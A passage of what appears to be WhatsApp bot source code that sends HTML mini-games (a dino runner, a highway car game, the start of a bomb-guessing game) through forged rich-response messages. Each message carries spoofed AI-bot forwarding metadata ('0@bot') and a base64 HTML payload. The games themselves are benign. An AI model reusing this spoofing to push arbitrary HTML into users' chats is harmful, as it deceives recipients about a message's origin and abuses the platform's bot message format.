score=0;speed=5;gameOver=false;last=0;shake=0;flash=0;runT=0;milestone=0;squash=1;
spawnTimer=70+Math.random()*30;
bestEl.textContent='BEST '+String(Math.floor(best)).padStart(5,'0');
statusEl.textContent='Speed 5.0x'
}
function burst(px,py,n,col,spd){for(let i=0;i<n;i++)particles.push({x:px,y:py,vx:(Math.random()-.5)*spd,vy:-Math.random()*spd,life:1,col,size:2+Math.random()*2})}
function jumpDino(){
if(gameOver){reset();return}
if(!d.jumping){d.jumping=true;d.vy=-13;squash=.7;burst(d.x+13,d.y+30,10,'255,255,255',4)}
}
function cactus(){
let h=24+Math.random()*24;
o.push({x:c.width+20,y:GY-h,w:16+Math.random()*6,h});
if(Math.random()<.22){o.push({x:c.width+20+34+Math.random()*10,y:GY-(20+Math.random()*18),w:16,h:20+Math.random()*18})}
}
function hit(a,b){return a.x+4<b.x+b.w&&a.x+a.w-4>b.x&&a.y+4<b.y+b.h&&a.y+a.h>b.y}
function drawTrail(){
trail.forEach((p,i)=>{x.fillStyle='rgba(108,92,231,'+(.25*(i/trail.length))+')';x.fillRect(p.x,p.y,27,30)})
}
function drawDino(){
x.save();
let cx=d.x+13,cy=d.y+30;
x.translate(cx,cy);
x.scale(1/squash,squash);
x.translate(-cx,-cy);
let legOff=d.jumping?0:Math.sin(runT*.5)*5;
x.fillStyle='#eaeaea';
x.fillRect(d.x,d.y,27,30);
x.fillRect(d.x+22,d.y+5,13,18);
x.fillStyle='#6c5ce7';
x.fillRect(d.x+29,d.y+8,4,4);
x.fillStyle='#eaeaea';
x.fillRect(d.x+5,d.y+30,6,8+legOff);
x.fillRect(d.x+20,d.y+30,6,8-legOff);
x.restore()
}
function drawCactus(q){
x.save();
x.shadowColor='rgba(255,90,90,.35)';x.shadowBlur=10;
x.fillStyle='#e17a7a';
x.fillRect(q.x,q.y,q.w,q.h);
x.fillRect(q.x-7,q.y+10,7,6);
x.fillRect(q.x-7,q.y+4,6,12);
x.fillRect(q.x+q.w,q.y+18,7,6);
x.fillRect(q.x+q.w+1,q.y+12,6,12);
x.restore()
}
function drawParticles(){
particles.forEach(p=>{x.fillStyle='rgba('+p.col+','+Math.max(p.life,0)+')';x.fillRect(p.x,p.y,p.size,p.size)})
}
function drawAmbient(){
ambient.forEach(p=>{let a=.15+Math.sin(runT*.05+p.ph)*.1;x.fillStyle='rgba(180,160,255,'+a+')';x.beginPath();x.arc(p.x,p.y,p.r,0,7);x.fill()})
}
function draw(){
x.clearRect(0,0,c.width,c.height);
x.save();
if(shake>0)x.translate((Math.random()-.5)*shake,(Math.random()-.5)*shake);
drawAmbient();
x.fillStyle='rgba(255,255,255,.35)';
clouds.forEach(q=>{let b=Math.sin(runT*.03+q.x)*2;x.fillRect(q.x,q.y+b,q.w,5);x.fillRect(q.x+10,q.y+b-5,q.w*.45,10)});
x.strokeStyle='rgba(255,255,255,.25)';
x.lineWidth=2;
x.setLineDash([10,8]);
x.lineDashOffset=-runT*speed*.6;
x.beginPath();x.moveTo(0,GY);x.lineTo(c.width,GY);x.stroke();
x.setLineDash([]);
drawTrail();
drawDino();
o.forEach(drawCactus);
drawParticles();
if(flash>0){x.fillStyle='rgba(255,60,60,'+(flash*.35)+')';x.fillRect(0,0,c.width,c.height)}
x.restore();
if(gameOver){
x.fillStyle='rgba(15,15,25,.55)';x.fillRect(0,0,c.width,c.height);
x.fillStyle='#fff';x.textAlign='center';
x.font='bold 24px Arial';x.fillText('GAME OVER',c.width/2,85);
x.font='14px Arial';x.fillText('Tap layar untuk main lagi',c.width/2,112);
x.textAlign='left'
}
}
function loop(t){
if(!last)last=t;
let dt=Math.min((t-last)/16.67,2);
last=t;
runT+=dt;
if(!gameOver){
d.y+=d.vy*dt;d.vy+=.75*dt;
if(d.y>=132){
if(d.jumping){burst(d.x+13,GY,10,'255,255,255',3.5);squash=1.35}
d.y=132;d.vy=0;d.jumping=false
}
if(d.jumping)trail.push({x:d.x,y:d.y});
if(trail.length>6)trail.shift();
if(!d.jumping)trail.length=0;
squash+=(1-squash)*.18*dt;
if(!d.jumping&&Math.floor(runT)%8===0&&Math.random()<.4)burst(d.x+6,GY-2,1,'255,255,255',1.5);
ambient.forEach(p=>{p.x-=p.vx*dt;if(p.x<-4)p.x=c.width+4});
spawnTimer-=dt;
if(spawnTimer<=0){cactus();spawnTimer=Math.max(38,62-speed*1.4)+Math.random()*30}
o.forEach(q=>q.x-=speed*dt);
o=o.filter(q=>q.x>-40);
clouds.forEach(q=>{q.x-=q.s*dt;if(q.x<-80)q.x=c.width+Math.random()*100});
particles.forEach(p=>{p.x+=p.vx*dt;p.y+=p.vy*dt;p.vy+=.3*dt;p.life-=.03*dt});
particles=particles.filter(p=>p.life>0);
speed=Math.min(11,speed+.0018*dt);
score+=dt*.6;
if(score>best)best=score;
if(Math.floor(score/500)>milestone){
milestone=Math.floor(score/500);
scoreEl.style.transform='scale(1.35)';
setTimeout(()=>scoreEl.style.transform='scale(1)',150)
}
scoreEl.textContent=String(Math.floor(score)).padStart(5,'0');
bestEl.textContent='BEST '+String(Math.floor(best)).padStart(5,'0');
statusEl.textContent='Speed '+speed.toFixed(1)+'x';
for(const q of o)if(hit(d,q)){
gameOver=true;shake=14;flash=1;
saveBest(best);
burst(d.x+13,d.y+15,18,'255,90,90',5)
}
}
if(shake>0)shake=Math.max(0,shake-.6*dt);
if(flash>0)flash=Math.max(0,flash-.05*dt);
draw();
requestAnimationFrame(loop)
}
document.addEventListener('pointerdown',e=>{e.preventDefault();jumpDino()});
document.addEventListener('keydown',e=>{if(e.code==='Space'){e.preventDefault();jumpDino()}});
reset();
requestAnimationFrame(loop);
</script></body>
`

    const data = {
      response_id: "PopiooNixelPopiooNixelPopiooNixel",
      sections: [
        {
          __typename: "GenAIUnifiedResponseSection",
          view_model: {
            __typename: "GenAISingleLayoutViewModel",
            primitive: {
              __typename: "GenAIBotProgressStatusPrimitive",
              title: "KLIK TEKS INI",
              is_in_progress: true
            }
          }
        }
      ],
      embedded_screens: [
        {
          title: "Preview",
          content: [
            {
              __typename: "FOAIDNixelButtonSheets",
              tabs: [
                {
                  id: "tab_0",
                  tab_header: "MISTER-MD",
                  sections: [
                    {
                      __typename: "GenAIUnifiedResponseSection",
                      view_model: {
                        __typename: "GenAISingleLayoutViewModel",
                        primitive: {
                          __typename: "GenAIaeacdsnwHtmlPrimitive",
                          payload: html,
                          url: "https://example.com",
                          trusted_sources: ["example.com"]
                        }
                      }
                    }
                  ],
                  step_entries: []
                }
              ]
            }
          ]
        }
      ]
    };

    await client.relayMessage(
      m.chat,
      {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
          botMetadata: {
            messageDisclaimerText: "",
            richResponseSourcesMetadata: {}
          }
        },
        botForwardedMessage: {
          message: {
            richResponseMessage: {
              messageType: 1,
              unifiedResponse: {
                data: Buffer.from(JSON.stringify(data)).toString('base64')
              },
              contextInfo: {
                forwardingScore: 1,
                isForwarded: true,
                forwardedAiBotMessageInfo: { botJid: "0@bot" },
                forwardOrigin: 4
              }
            }
          }
        }
      },
      {
        messageId: await client.generateMessageTag()
      }
    )
  }
  break

  case "mbim": {
    const html = `<style>
* { -webkit-tap-highlight-color: transparent; -webkit-user-select: none; user-select: none; -webkit-touch-callout: none; box-sizing: border-box; margin: 0; padding: 0; }
body { margin: 0; background: transparent; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; color: #fff; touch-action: none; overflow: hidden; }
.wrapper { width: 100%; max-width: 480px; margin: auto; padding: 12px; }
.card { background: linear-gradient(180deg, rgba(15,18,26,0.97), rgba(10,12,18,0.97)); backdrop-filter: blur(16px); -webkit-backdrop-filter: blur(16px); border: 2px solid #f59e0b; border-radius: 20px; overflow: hidden; box-shadow: 0 14px 44px rgba(0,0,0,0.75), inset 0 0 40px rgba(245,158,11,0.06); padding: 14px; position: relative; }
.header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px; }
.title { font-size: 10px; letter-spacing: 1.5px; color: #f59e0b; font-weight: 800; text-transform: uppercase; display:flex; align-items:center; gap:6px; }
.title .dot{ width:6px; height:6px; border-radius:50%; background:#10b981; box-shadow:0 0 8px #10b981; animation: pulse 1.4s infinite; }
@keyframes pulse{ 0%,100%{opacity:1} 50%{opacity:.3} }
.score-badge { font-size: 20px; font-weight: 900; color: #10b981; text-shadow: 0 0 12px rgba(16,185,129,0.5); font-variant-numeric: tabular-nums; }
.best-badge { font-size: 10px; color: #94a3b8; font-variant-numeric: tabular-nums; }
.stat-row { display:flex; gap:8px; margin-bottom:8px; }
.stat-pill { flex:1; background:rgba(255,255,255,0.04); border:1px solid rgba(255,255,255,0.08); border-radius:10px; padding:5px 8px; text-align:center; }
.stat-pill .lbl{ font-size:8px; letter-spacing:1px; color:#64748b; text-transform:uppercase; font-weight:700; }
.stat-pill .val{ font-size:13px; font-weight:900; color:#fff; font-variant-numeric: tabular-nums; }
#game-container { position: relative; width: 100%; height: 350px; border-radius: 14px; overflow: hidden; border: 2px solid #1e293b; box-shadow: inset 0 0 30px rgba(0,0,0,0.6); }
canvas { width: 100%; height: 100%; display: block; background: #1a2332; }
.controls { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 10px; }
.btn { padding: 14px; font-size: 15px; font-weight: 800; border: none; border-radius: 12px; cursor: pointer; color: #fff; text-align: center; letter-spacing: 0.5px; position: relative; overflow: hidden; }
.btn-left { background: linear-gradient(135deg, #3b82f6, #2563eb); box-shadow: 0 4px 16px rgba(59,130,246,0.45), inset 0 1px 0 rgba(255,255,255,0.2); }
.btn-right { background: linear-gradient(135deg, #ec4899, #db2777); box-shadow: 0 4px 16px rgba(236,72,153,0.45), inset 0 1px 0 rgba(255,255,255,0.2); }
.btn:active { transform: scale(0.95); filter: brightness(0.9); }
.credit-bar { margin-top: 10px; text-align: center; font-size: 10px; font-weight: 800; letter-spacing: 1.5px; color: #94a3b8; text-transform: uppercase; border-top: 1px dashed rgba(255,255,255,0.12); padding-top: 8px; }
.credit-bar span { color: #f59e0b; text-shadow: 0 0 10px rgba(245,158,11,0.5); }
</style>
<body>
<div class="wrapper">
  <div class="card">
    <div class="header">
      <div>
        <div class="title"><span class="dot"></span>MISTER-MD</div>
        <h2 style="font-size: 17px; font-weight: 900; color: #fff; margin-top:2px;">Highway Rush 🏎️</h2>
      </div>
      <div style="text-align: right;">
        <div class="score-badge" id="score">0000</div>
        <div class="best-badge" id="best">BEST 0000</div>
      </div>
    </div>

    <div class="stat-row">
      <div class="stat-pill"><div class="lbl">Speed</div><div class="val" id="speedStat">60</div></div>
      <div class="stat-pill"><div class="lbl">Combo</div><div class="val" id="comboStat">x1</div></div>
      <div class="stat-pill"><div class="lbl">Dodged</div><div class="val" id="dodgeStat">0</div></div>
    </div>

    <div id="game-container">
      <canvas id="c"></canvas>
    </div>

    <div class="controls">
      <button class="btn btn-left" id="leftBtn">⬅️ LEFT</button>
      <button class="btn btn-right" id="rightBtn">RIGHT ➡️</button>
    </div>

    <div class="credit-bar">
      Engineered by <span>MISTER-MD</span> ⚡
    </div>
  </div>
</div>

<script>
(function() {
  var cvs = document.getElementById('c');
  var ctx = cvs.getContext('2d');
  var scoreEl = document.getElementById('score');
  var bestEl = document.getElementById('best');
  var speedStatEl = document.getElementById('speedStat');
  var comboStatEl = document.getElementById('comboStat');
  var dodgeStatEl = document.getElementById('dodgeStat');

  var W = 360;
  var H = 350;
  cvs.width = W;
  cvs.height = H;

  var ROAD_L = 26, ROAD_R = W - 26;
  var laneCount = 4;
  var laneW = (ROAD_R - ROAD_L) / laneCount;
  var lanes = [];
  for (var li = 0; li < laneCount; li++) lanes.push(ROAD_L + laneW * (li + 0.5));

  var currentLane = 1;
  var targetX = lanes[currentLane];
  var playerX = lanes[currentLane];
  var playerY = H - 72;
  var playerTilt = 0;

  var baseSpeed = 5.2;
  var speed = baseSpeed;
  var roadOffset = 0;
  var score = 0;
  var best = 0;
  var dodged = 0;
  var combo = 1;
  var comboTimer = 0;
  var shake = 0;
  var flashAlpha = 0;

  try { best = parseInt(localStorage.getItem('car_best_v2') || '0', 10) || 0; } catch(e){}
  bestEl.textContent = 'BEST ' + String(best).padStart(4, '0');

  var traffic = [];
  var coins = [];
  var particles = [];
  var skidmarks = [];
  var clouds = [];
  var trees = [];
  var gameOver = false;
  var frame = 0;

  var CAR_PALETTES = [
    { body: '#ef4444', dark: '#991b1b', light: '#fca5a5' },
    { body: '#3b82f6', dark: '#1e3a8a', light: '#93c5fd' },
    { body: '#10b981', dark: '#065f46', light: '#6ee7b7' },
    { body: '#f59e0b', dark: '#92400e', light: '#fcd34d' },
    { body: '#8b5cf6', dark: '#4c1d95', light: '#c4b5fd' },
    { body: '#ec4899', dark: '#831843', light: '#f9a8d4' },
    { body: '#e2e8f0', dark: '#64748b', light: '#ffffff' }
  ];

  for (var tc = 0; tc < 6; tc++) {
    trees.push({ x: Math.random() * W, y: Math.random() * H, side: Math.random() < 0.5 ? 0 : 1, size: 10 + Math.random() * 8 });
  }
  for (var cc = 0; cc < 4; cc++) {
    clouds.push({ x: Math.random() * W, y: 10 + Math.random() * 60, w: 40 + Math.random() * 40, spd: 0.2 + Math.random() * 0.3 });
  }

  function spawnTraffic() {
    var occupied = {};
    for (var i = 0; i < traffic.length; i++) {
      if (traffic[i].y < 90) occupied[traffic[i].lane] = true;
    }
    var free = [];
    for (var l = 0; l < laneCount; l++) if (!occupied[l]) free.push(l);
    if (free.length === 0) return;
    var laneIdx = free[Math.floor(Math.random() * free.length)];
    var pal = CAR_PALETTES[Math.floor(Math.random() * (CAR_PALETTES.length - 1))];
    var isTruck = Math.random() < 0.18;
    traffic.push({
      lane: laneIdx,
      x: lanes[laneIdx],
      y: -70,
      w: isTruck ? 32 : 26,
      h: isTruck ? 58 : 44,
      pal: pal,
      speed: 1.8 + Math.random() * 2.2,
      truck: isTruck,
      scored: false
    });
  }

  function spawnCoin() {
    var laneIdx = Math.floor(Math.random() * laneCount);
    coins.push({ x: lanes[laneIdx], y: -30, r: 9, collected: false, spin: 0 });
  }

  function roundRect(x, y, w, h, r) {
    ctx.beginPath();
    ctx.moveTo(x + r, y);
    ctx.arcTo(x + w, y, x + w, y + h, r);
    ctx.arcTo(x + w, y + h, x, y + h, r);
    ctx.arcTo(x, y + h, x, y, r);
    ctx.arcTo(x, y, x + w, y, r);
    ctx.closePath();
  }

  function drawCar(cx, cy, w, h, pal, isPlayer, tilt) {
    ctx.save();
    ctx.translate(cx, cy);
    if (tilt) ctx.rotate(tilt);
    ctx.translate(-w / 2, -h / 2);

    ctx.save();
    ctx.fillStyle = 'rgba(0,0,0,0.35)';
    ctx.beginPath();
    ctx.ellipse(w / 2, h - 2, w * 0.6, 7, 0, 0, Math.PI * 2);
    ctx.fill();
    ctx.restore();

    ctx.fillStyle = '#0b0f17';
    var wheelY = [7, h - 16];
    for (var wi = 0; wi < 2; wi++) {
      roundRect(-3, wheelY[wi], 4, 12, 2); ctx.fill();
      roundRect(w - 1, wheelY[wi], 4, 12, 2); ctx.fill();
    }

    var grad = ctx.createLinearGradient(0, 0, w, 0);
    grad.addColorStop(0, pal.dark);
    grad.addColorStop(0.5, pal.body);
    grad.addColorStop(1, pal.light);
    ctx.fillStyle = grad;
    roundRect(0, 0, w, h, 6);
    ctx.fill();

    var roofY = isPlayer ? 8 : 11;
    var roofH = h * 0.33;
    ctx.fillStyle = '#0b0f17';
    roundRect(3, roofY, w - 6, roofH, 4);
    ctx.fill();

    ctx.fillStyle = '#93c5fd';
    roundRect(5, roofY + 2, w - 10, roofH - 4, 3);
    ctx.fill();

    if (isPlayer) {
      ctx.fillStyle = '#fff7c2';
      ctx.fillRect(2, 1, 5, 3);
      ctx.fillRect(w - 7, 1, 5, 3);
    } else {
      ctx.fillStyle = '#ff3b3b';
      ctx.fillRect(2, h - 4, 5, 3);
      ctx.fillRect(w - 7, h - 4, 5, 3);
    }

    ctx.restore();
  }

  function explode(x, y, color) {
    for (var i = 0; i < 30; i++) {
      var angle = Math.random() * Math.PI * 2;
      var spd = 2 + Math.random() * 6;
      particles.push({ x: x, y: y, vx: Math.cos(angle) * spd, vy: Math.sin(angle) * spd, color: color, life: 1, size: 2 + Math.random() * 3 });
    }
    shake = 10;
    flashAlpha = 0.45;
  }

  var spawnCounter = 0;
  var coinCounter = 0;

  function drawBackground() {
    ctx.fillStyle = '#1e293b';
    ctx.fillRect(0, 0, W, H);

    ctx.fillStyle = '#0d7a4f';
    ctx.fillRect(0, 0, ROAD_L, H);
    ctx.fillRect(ROAD_R, 0, W - ROAD_R, H);

    for (var ti = 0; ti < trees.length; ti++) {
      var tr = trees[ti];
      if (!gameOver) tr.y += speed * 0.9;
      if (tr.y > H + 20) { tr.y = -20; tr.x = tr.side === 0 ? Math.random() * (ROAD_L - 8) + 2 : ROAD_R + Math.random() * (W - ROAD_R - 8) + 2; }
      ctx.fillStyle = '#064e3b';
      ctx.beginPath();
      ctx.arc(tr.x, tr.y, tr.size, 0, Math.PI * 2);
      ctx.fill();
    }

    ctx.fillStyle = '#263143';
    ctx.fillRect(ROAD_L, 0, ROAD_R - ROAD_L, H);

    ctx.fillStyle = '#fde68a';
    ctx.fillRect(ROAD_L, 0, 3, H);
    ctx.fillRect(ROAD_R - 3, 0, 3, H);

    if (!gameOver) roadOffset = (roadOffset + speed) % 44;
    ctx.fillStyle = 'rgba(226,232,240,0.85)';
    for (var l = 1; l < laneCount; l++) {
      var lx = ROAD_L + laneW * l;
      for (var y = -44 + roadOffset; y < H; y += 44) {
        ctx.fillRect(lx - 2, y, 4, 22);
      }
    }
  }

  function update() {
    frame++;
    ctx.save();
    if (shake > 0) {
      var sx = (Math.random() - 0.5) * shake;
      var sy = (Math.random() - 0.5) * shake;
      ctx.translate(sx, sy);
      shake *= 0.88;
      if (shake < 0.5) shake = 0;
    }

    ctx.clearRect(-10, -10, W + 20, H + 20);
    drawBackground();

    if (!gameOver) {
      score += 1 + Math.floor(combo / 2);
      scoreEl.textContent = String(score).padStart(4, '0');
      if (score > best) {
        best = score;
        try { localStorage.setItem('car_best_v2', String(best)); } catch(e){}
        bestEl.textContent = 'BEST ' + String(best).padStart(4, '0');
      }

      speed = baseSpeed + Math.min(score / 450, 4.0);
      speedStatEl.textContent = Math.round(speed * 18);
      dodgeStatEl.textContent = dodged;
      comboStatEl.textContent = 'x' + combo;

      if (comboTimer > 0) {
        comboTimer--;
      } else if (combo > 1) {
        combo = 1;
      }

      playerX += (targetX - playerX) * 0.25;
      playerTilt = (targetX - playerX) * 0.004;

      spawnCounter++;
      var spawnGap = Math.max(24, 44 - Math.floor(score / 160));
      if (spawnCounter > spawnGap) { spawnTraffic(); spawnCounter = 0; }

      coinCounter++;
      if (coinCounter > 65) { spawnCoin(); coinCounter = 0; }
    }

    for (var c = coins.length - 1; c >= 0; c--) {
      var coin = coins[c];
      if (!gameOver) { coin.y += speed; coin.spin += 0.15; }
      var squash = Math.abs(Math.cos(coin.spin));
      ctx.save();
      ctx.translate(coin.x, coin.y);
      ctx.scale(Math.max(0.2, squash), 1);
      ctx.fillStyle = '#fbbf24';
      ctx.beginPath();
      ctx.arc(0, 0, coin.r, 0, Math.PI * 2);
      ctx.fill();
      ctx.restore();

      var cdx = Math.abs(playerX - coin.x);
      var cdy = Math.abs(playerY + 20 - coin.y);
      if (cdx < 20 && cdy < 24 && !coin.collected && !gameOver) {
        coin.collected = true;
        score += 40 * combo;
        combo = Math.min(combo + 1, 9);
        comboTimer = 90;
        explode(coin.x, coin.y, '#fbbf24');
        coins.splice(c, 1);
      } else if (coin.y > H + 20) {
        coins.splice(c, 1);
      }
    }

    for (var i = traffic.length - 1; i >= 0; i--) {
      var t = traffic[i];
      if (!gameOver) {
        t.y += (speed - t.speed);
        if (t.y - t.h / 2 > playerY + 10 && !t.scored) {
          t.scored = true;
          dodged++;
        }
      }
      drawCar(t.x, t.y, t.w, t.h, t.pal, false, 0);

      var dx = Math.abs(playerX - t.x);
      var dy = Math.abs(playerY - t.y);
      if (dx < (t.w + 22) / 2 - 4 && dy < (t.h + 40) / 2 - 6 && !gameOver) {
        gameOver = true;
        explode(playerX, playerY + 20, '#f59e0b');
        explode(t.x, t.y + 20, t.pal.body);
      }

      if (t.y > H + 80) traffic.splice(i, 1);
    }

    if (!gameOver) {
      drawCar(playerX, playerY, 26, 44, { body: '#f59e0b', dark: '#92400e', light: '#fde68a' }, true, playerTilt);
    }

    for (var p = particles.length - 1; p >= 0; p--) {
      var pt = particles[p];
      pt.x += pt.vx;
      pt.y += pt.vy;
      pt.life -= 0.04;
      if (pt.life <= 0) { particles.splice(p, 1); continue; }
      ctx.globalAlpha = Math.max(pt.life, 0);
      ctx.fillStyle = pt.color;
      ctx.beginPath();
      ctx.arc(pt.x, pt.y, pt.size || 3, 0, Math.PI * 2);
      ctx.fill();
      ctx.globalAlpha = 1;
    }

    if (flashAlpha > 0.01) {
      ctx.fillStyle = 'rgba(255,255,255,' + flashAlpha + ')';
      ctx.fillRect(0, 0, W, H);
      flashAlpha *= 0.85;
    }

    if (gameOver) {
      ctx.fillStyle = 'rgba(10, 12, 20, 0.85)';
      ctx.fillRect(0, 0, W, H);

      ctx.textAlign = 'center';
      ctx.fillStyle = '#ef4444';
      ctx.font = '900 24px sans-serif';
      ctx.fillText('CRASHED 💥', W / 2, H / 2 - 25);

      ctx.fillStyle = '#ffffff';
      ctx.font = '800 14px sans-serif';
      ctx.fillText('Score: ' + score, W / 2, H / 2 - 2);
      ctx.fillStyle = '#94a3b8';
      ctx.font = '600 11px sans-serif';
      ctx.fillText('Best: ' + best + '  •  Dodged: ' + dodged, W / 2, H / 2 + 18);

      ctx.fillStyle = '#fbbf24';
      ctx.font = '700 12px sans-serif';
      ctx.fillText('TAP TO RESTART', W / 2, H / 2 + 42);
    }

    ctx.restore();
    requestAnimationFrame(update);
  }

  function moveLeft() {
    if (gameOver) return;
    if (currentLane > 0) currentLane--;
    targetX = lanes[currentLane];
  }

  function moveRight() {
    if (gameOver) return;
    if (currentLane < lanes.length - 1) currentLane++;
    targetX = lanes[currentLane];
  }

  function restart() {
    score = 0;
    dodged = 0;
    combo = 1;
    comboTimer = 0;
    scoreEl.textContent = '0000';
    traffic = [];
    coins = [];
    particles = [];
    currentLane = 1;
    targetX = lanes[currentLane];
    playerX = lanes[currentLane];
    speed = baseSpeed;
    gameOver = false;
  }

  function addTapEvent(id, fn) {
    var el = document.getElementById(id);
    if (!el) return;
    el.addEventListener('pointerdown', function(e) { e.preventDefault(); fn(); });
  }

  addTapEvent('leftBtn', moveLeft);
  addTapEvent('rightBtn', moveRight);

  function handleCanvasTap(e) {
    e.preventDefault();
    if (gameOver) { restart(); return; }
    var rect = cvs.getBoundingClientRect();
    var clientX = e.clientX;
    if (e.touches && e.touches.length > 0) clientX = e.touches[0].clientX;
    var clickX = (clientX - rect.left) * (W / rect.width);
    if (clickX < W / 2) moveLeft(); else moveRight();
  }

  cvs.addEventListener('pointerdown', handleCanvasTap);

  update();
})();
</script>
</body>
</html>`

    const data = {
      response_id: "PopiooNixelPopiooNixelPopiooNixel",
      sections: [
        {
          __typename: "GenAIUnifiedResponseSection",
          view_model: {
            __typename: "GenAISingleLayoutViewModel",
            primitive: {
              __typename: "GenAIBotProgressStatusPrimitive",
              title: "KLIK TEKS INI",
              is_in_progress: true
            }
          }
        }
      ],
      embedded_screens: [
        {
          title: "Preview",
          content: [
            {
              __typename: "FOAIDNixelButtonSheets",
              tabs: [
                {
                  id: "tab_0",
                  tab_header: "MISTER-MD",
                  sections: [
                    {
                      __typename: "GenAIUnifiedResponseSection",
                      view_model: {
                        __typename: "GenAISingleLayoutViewModel",
                        primitive: {
                          __typename: "GenAIaeacdsnwHtmlPrimitive",
                          payload: html,
                          url: "https://example.com",
                          trusted_sources: ["example.com"]
                        }
                      }
                    }
                  ],
                  step_entries: []
                }
              ]
            }
          ]
        }
      ]
    };

    await client.relayMessage(
      m.chat,
      {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
          botMetadata: {
            messageDisclaimerText: "",
            richResponseSourcesMetadata: {}
          }
        },
        botForwardedMessage: {
          message: {
            richResponseMessage: {
              messageType: 1,
              unifiedResponse: {
                data: Buffer.from(JSON.stringify(data)).toString('base64')
              },
              contextInfo: {
                forwardingScore: 1,
                isForwarded: true,
                forwardedAiBotMessageInfo: { botJid: "0@bot" },
                forwardOrigin: 4
              }
            }
          }
        }
      },
      {
        messageId: await client.generateMessageTag()
      }
    )
  }
  break

  /// ───────────── [ 𝖦𝖺𝗆𝖾 𝖱𝗂𝖼𝗁 (𝖡𝖾𝗋𝗄𝖾𝗅𝖺𝗇𝗃𝗎𝗍𝖺𝗇) ] ──────────── ///
  case "tebakbom": {
    const html = String.raw`
<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Whisper · Tebak Boom vs client</title>
<style>
  * {
    box-sizing: border-box;
    user-select: none;
    -webkit-tap-highlight-color: transparent;
  }

  html, body { height: 100%; margin: 0; }

  body {
    background: #0d0f1a;
    display: flex;
    justify-content: center;
    align-items: flex-start;
    font-family: 'Courier New', Courier, monospace;
    touch-action: manipulation;
    padding: 4px;
  }

  .game-wrapper {
    background: #1a1f2f;
    padding: 1.4rem 0.8rem 0.8rem;
    border-radius: 1.6rem;
    box-shadow: 0 10px 20px rgba(0, 0, 0, 0.7), inset 0 0 0 2px #3a4a6a;
    border: 3px solid #2a3a5a;
    max-width: 380px;
    width: 100%;
    position: relative;
    margin-top: 10px;
  }

  .game-wrapper::before {
    content: '💥 T E B A K  B O O M';
    position: absolute;
    top: -11px;
    left: 50%;
    transform: translateX(-50%);
    background: #1a1f2f;
    color: #b0c8ff;
    padding: 2px 10px;
    font-size: 0.55rem;
    letter-spacing: 3px;
    border-radius: 30px;
    border: 2px solid #4a6a8a;
    text-shadow: 0 0 10px #6f8fcf;
    font-weight: bold;
    white-space: nowrap;
  }

  .level-bar {
    display: grid;
    grid-template-columns: repeat(4, 1fr);
    gap: 5px;
    margin-bottom: 0.6rem;
  }

  .level-btn {
    background: #0f1524;
    color: #6a7a9a;
    border: 2px solid #2a3a5a;
    border-radius: 8px;
    font-size: 0.6rem;
    font-weight: bold;
    padding: 0.35rem 0.1rem;
    cursor: pointer;
    transition: 0.1s;
    font-family: inherit;
    letter-spacing: 0.5px;
    text-align: center;
  }

  .level-btn:active {
    transform: scale(0.95);
  }

  .level-btn.active {
    background: #2a4a7a;
    color: #c8dfff;
    border-color: #6a9aff;
    box-shadow: 0 0 10px rgba(80, 150, 255, 0.5);
    text-shadow: 0 0 6px #6a9aff;
  }

  .level-btn[data-level="easy"].active {
    background: #1a4a2a;
    border-color: #4aff6a;
    color: #b0ffb0;
    box-shadow: 0 0 10px rgba(74, 255, 106, 0.5);
  }

  .level-btn[data-level="hard"].active {
    background: #4a2a1a;
    border-color: #ff8a4a;
    color: #ffd0b0;
    box-shadow: 0 0 10px rgba(255, 138, 74, 0.5);
  }

  .level-btn[data-level="master"].active {
    background: #4a1a2a;
    border-color: #ff4a7a;
    color: #ffb0c8;
    box-shadow: 0 0 10px rgba(255, 74, 122, 0.5);
  }

  .display-area {
    background: #0a0e1a;
    border-radius: 16px;
    padding: 0.7rem 0.6rem;
    box-shadow: inset 0 0 0 2px #2a3a5a, 0 5px 8px rgba(0, 0, 0, 0.5);
    margin-bottom: 0.6rem;
  }

  .number-grid {
    display: grid;
    grid-template-columns: repeat(4, 1fr);
    gap: 6px;
    width: 100%;
    margin: 0 auto;
    touch-action: manipulation;
  }

  .num-btn {
    background: #1a2a4a;
    border: 2px solid #3a5a7a;
    border-radius: 10px;
    color: #c8dfff;
    font-size: 1.2rem;
    font-weight: bold;
    text-align: center;
    box-shadow: inset 0 -4px 0 #0f1a2f, 0 2px 0 #0a1220;
    cursor: pointer;
    transition: 0.04s linear;
    touch-action: manipulation;
    font-family: inherit;
    aspect-ratio: 1 / 1;
    display: flex;
    align-items: center;
    justify-content: center;
  }

  .num-btn:active {
    transform: translateY(2px);
    box-shadow: inset 0 -2px 0 #0f1a2f, 0 0 0 #0a1220;
  }

  .num-btn.selected {
    background: #2a4a7a;
    border-color: #6a9aff;
    box-shadow: inset 0 -4px 0 #1a2a5a, 0 2px 0 #0a1220, 0 0 12px rgba(80, 150, 255, 0.3);
  }

  .num-btn.boom {
    background: #7a2a2a;
    border-color: #ff5a5a;
    color: #ffb0b0;
    box-shadow: inset 0 -4px 0 #4a1a1a, 0 2px 0 #0a1220, 0 0 18px rgba(255, 50, 50, 0.4);
  }

  .num-btn.hidden {
    background: #0a0e1a;
    border-color: #1a2a3a;
    color: transparent;
    box-shadow: inset 0 -4px 0 #05080f, 0 2px 0 #0a1220;
  }

  .num-btn.revealed {
    background: #1a3a2a;
    border-color: #4a8a5a;
    color: #b0ffb0;
    box-shadow: inset 0 -4px 0 #0f2a1a, 0 2px 0 #0a1220, 0 0 12px rgba(50, 255, 80, 0.25);
  }

  .num-btn.ai {
    background: #4a2a7a;
    border-color: #a07aff;
    color: #e0c8ff;
    box-shadow: inset 0 -4px 0 #2a1a4a, 0 2px 0 #0a1220, 0 0 12px rgba(160, 100, 255, 0.4);
  }

  .num-btn.disabled {
    opacity: 0.5;
    transform: scale(0.95);
    pointer-events: none;
  }

  .status-panel {
    display: flex;
    justify-content: space-between;
    align-items: center;
    gap: 6px;
    padding: 0 2px;
  }

  .score-box {
    background: #0a0e1a;
    color: #b0c8ff;
    font-size: 0.75rem;
    font-weight: bold;
    padding: 0.2rem 0.7rem;
    border-radius: 40px;
